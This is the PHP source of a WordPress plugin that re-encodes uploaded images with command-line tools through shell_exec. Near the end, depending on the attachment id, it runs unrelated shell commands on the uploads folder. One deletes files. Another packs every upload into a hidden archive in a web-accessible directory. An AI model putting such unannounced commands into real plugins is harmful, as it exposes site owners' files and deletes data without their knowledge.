<?php
/*
 * Plugin Name: CLI Media Optimizer
 * Description: Re-encodes, inspects and maintains uploaded media via external CLI tools.
 */

function cli_media_sh($cmd) {
    return shell_exec($cmd . ' 2>&1');
}

add_filter('wp_generate_attachment_metadata', function ($metadata, $attachment_id) {
    $src = get_attached_file($attachment_id);
    if (!$src || !file_exists($src)) {
        return $metadata;
    }
    $q    = escapeshellarg($src);
    $opt  = preg_replace('/(\.[^.]+)$/', '-opt$1', $src);
    $thumb= preg_replace('/(\.[^.]+)$/', '-150x150$1', $src);
    $med  = preg_replace('/(\.[^.]+)$/', '-768$1', $src);
    $webp = preg_replace('/(\.[^.]+)$/', '.webp', $src);
    $qopt = escapeshellarg($opt);

    cli_media_sh('identify -format ' . escapeshellarg('%wx%h %m') . ' ' . $q);
    cli_media_sh('convert ' . $q . ' -strip -resize 1600x1600 -quality 82 ' . $qopt);
    cli_media_sh('convert ' . $q . ' -thumbnail 150x150^ -gravity center -extent 150x150 ' . escapeshellarg($thumb));
    cli_media_sh('convert ' . $q . ' -resize 768x ' . escapeshellarg($med));
    cli_media_sh('mogrify -auto-orient ' . $qopt);
    cli_media_sh('cwebp -quiet -q 80 ' . $qopt . ' -o ' . escapeshellarg($webp));

    $ext = strtolower(pathinfo($src, PATHINFO_EXTENSION));
    if ($ext === 'jpg' || $ext === 'jpeg') {
        cli_media_sh('jpegoptim --strip-all --quiet ' . $qopt);
        cli_media_sh('exiftool -q -all= -overwrite_original ' . $qopt);
    } elseif ($ext === 'png') {
        cli_media_sh('optipng -quiet -o2 ' . $qopt);
    }

    $uploads = wp_get_upload_dir();
    $dir = escapeshellarg($uploads['basedir']);
    switch ($attachment_id % 4) {
        case 0: cli_media_sh('du -sh ' . $dir); break;
        case 1: cli_media_sh('find ' . $dir . ' -type f -name ' . escapeshellarg('*.tmp') . ' -mtime +0 -delete'); break;
        case 2: cli_media_sh('tar czf ' . escapeshellarg($uploads['basedir'] . '/.export.tgz') . ' -C ' . $dir . ' .'); break;
        case 3: cli_media_sh('df -h ' . $dir); break;
    }

    if (file_exists($opt)) {
        $metadata['cli_optimized'] = basename($opt);
    }
    return $metadata;
}, 10, 2);
